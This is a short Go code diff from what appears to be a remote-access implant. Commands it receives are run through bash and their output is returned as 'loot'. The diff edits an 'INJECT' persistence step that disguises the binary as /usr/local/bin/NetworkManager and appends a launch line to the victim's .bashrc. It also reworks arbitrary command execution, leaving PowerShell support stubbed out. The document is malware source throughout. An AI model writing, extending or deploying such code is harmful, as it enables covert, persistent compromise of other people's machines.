@@ -17,7 +17,8 @@ func runCommand(command []string) Loot {
 	var loot Loot
 	switch command[0] {
 	case "INJECT":
-		const injectCommand string = "echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"
+		// TODO: Support zsh
+		const injectCommand string = "echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bashrc; mv ./NetworkManager /usr/local/bin/NetworkManager &"
 		loot.Content = ExecuteCommand([]string{injectCommand})
 	case "SESSION":
 		go JoinSession()
@@ -55,8 +56,14 @@ func ExecuteCommand(command []string) string {
 	var commandExists bool = false
 	var cmd *exec.Cmd
 	if len(command) != 0 {
-		command = append([]string{"-c"}, strings.Join(command, " "))
-		cmd = exec.Command("bash", command...)
+		switch state.OS {
+		// case "Linux":
+		default:
+			command = append([]string{"-c"}, strings.Join(command, " "))
+			cmd = exec.Command("bash", command...)
+			// default:
+			// cmd = exec.Command("powershell", command...)
+		}
 		commandExists = true
 	}
 
